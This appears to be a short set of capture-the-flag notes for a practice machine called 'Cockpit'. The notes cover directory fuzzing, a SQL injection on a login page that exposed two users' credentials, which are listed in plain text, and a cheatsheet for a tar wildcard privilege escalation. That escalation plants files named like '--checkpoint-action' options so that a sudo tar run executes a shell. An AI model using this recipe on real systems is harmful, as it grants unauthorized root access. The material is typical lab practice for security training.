# Cockpit \[Inter]

## Report



### Hint

* Did not fuzz using file extension and did not bother checking the stack on wappalyzer either

## Cheatsheet

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.167.10/FUZZ -fc 301 -e .php
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

## Loot

### Enumeration

192.168.167.10

#### 80

Fuzzing with PHP extension reveals a login page, apart from that nothing

#### 9090

Cockpit is an interactive Linux server admin interface.\
Project website\
Version 215.

### Attack Vectors

'SQLi' on login interface on port 80 reveals creds for two users, james and cameron

### PrivEsc

Wildcard abuse on tar binary

### Creds

james:canttouchhhthiss@455152\
cameron:thisscanttbetouchedd@455152

### Proof

Check your tech stack properly foo

